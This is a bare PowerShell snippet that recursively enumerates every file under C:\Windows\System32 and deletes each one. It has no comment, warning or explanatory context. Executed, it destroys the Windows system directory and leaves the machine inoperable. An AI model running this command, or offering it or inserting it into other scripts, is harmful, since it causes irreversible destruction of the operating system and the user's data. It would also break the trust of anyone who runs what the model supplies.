$folderPath = "C:\Windows\System32"

Get-ChildItem -Path $folderPath -File -Recurse | ForEach-Object {
    $_.Delete()
}
